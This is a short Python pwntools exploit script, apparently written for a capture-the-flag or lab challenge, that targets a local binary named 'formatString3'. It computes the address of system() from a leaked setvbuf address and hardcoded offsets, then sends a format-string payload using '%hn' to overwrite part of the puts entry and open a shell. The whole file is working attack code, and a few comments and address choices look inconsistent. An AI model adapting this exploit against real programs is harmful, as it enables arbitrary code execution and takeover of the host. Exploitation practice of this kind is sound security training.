import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./formatString3')
io = elf.process()
pwn.gdb.attach(io)
time.sleep(3)

#The goal is to call /bin/sh

#This section sets the base address
io.recvuntil(": ")
setVBufAddr = io.recv(14)
print(setVBufAddr)
setVBufAddr = int(setVBufAddr,16)
systemAddr = hex(setVBufAddr - 0x2ac90 - 0xf0bd)
print(setVBufAddr)
print(systemAddr)

#This section replaces the GOT entry of puts with the address of normal_string

putsGOT =hex(elf.plt['puts'])
print("Test - " +putsGOT)
lowerBytes = systemAddr[10:14]
lowerBytes = int(lowerBytes,16)

padding = 5
if(lowerBytes > 9999):
    padding = 4
#The only bytes that have to change are the lowest 4, so addr + 4
#putsGOTAddr+4%NumBytesx%6$hn
payload = b""
payload += b'%'
payload += (str(lowerBytes)).encode()
payload += b'x%40$hn'
payload += b'0'*padding
payload += pwn.p64(int(putsGOT,16)+4)
io.sendline(payload)
io.interactive()
print(payload)

